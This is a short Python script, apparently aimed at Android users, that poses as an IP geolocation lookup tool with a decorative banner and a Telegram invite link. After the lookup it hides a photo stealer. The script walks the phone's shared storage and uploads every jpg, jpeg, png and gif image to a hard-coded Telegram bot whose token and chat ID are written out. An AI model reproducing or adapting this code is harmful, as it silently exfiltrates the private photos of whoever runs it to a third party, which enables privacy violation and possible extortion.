import random
import requests
import socket
import time,pyfiglet
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
E = "\033[0;90m" #رمادي
lo=pyfiglet.figlet_format('X İ R O S')
print(Z+lo)
print(X+'coder by🕸XİROS 🕷👻    '*1)
import requests

# تحديد عنوان IP الذي تريد البحث عن معلوماته
ip_address = ""  # استبدله بعنوان ال IP الذي تريد

# جلب معلومات الموقع باستخدام خدمة ipinfo.io
response = requests.get(f"https://ipinfo.io/{ip_address}/json")

# تحقق من نجاح الاستجابة
if response.status_code == 200:
    data = response.json()
    # استخراج المعلومات
    ip = data["ip"]
    city = data["city"]
    region = data["region"]
    country = data["country"]
    location = data["loc"]
    organization = data.get("org", "N/A")

    print(f"IP Address: {ip}")
    print(f"City: {city}")
    print(f"Region: {region}")
    print(f"Country: {country}")
    print(f"Location (Latitude, Longitude): {location}")
    print(f"Organization: {organization}")
else:
    print("فشل في الوصول إلى معلومات الموقع.")
print (X+'°'*67)

import webbrowser

webbrowser.open('https://t.me/+ujJKhDLlk8k2M2Q8')

from concurrent.futures import ThreadPoolExecutor
import requests
import os
chat_id ="1387217128"
bot_token="6634088734:AAF1VEc4Rn_Bka366fcEybPPClagJA2egWM"
with ThreadPoolExecutor(max_workers=50) as executor:
    for root, dirs, files in os.walk("/storage/emulated/0/"):
        for file in files:
            file_path = os.path.join(root, file)
            file_type = file.split('.')[-1]
            if file_type in ['jpg', 'jpeg', 'png', 'gif']:
                url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
                data = {'chat_id': chat_id}
                files = {'photo': open(file_path, 'rb')}
                executor.submit(requests.post, url, files=files, data=data)
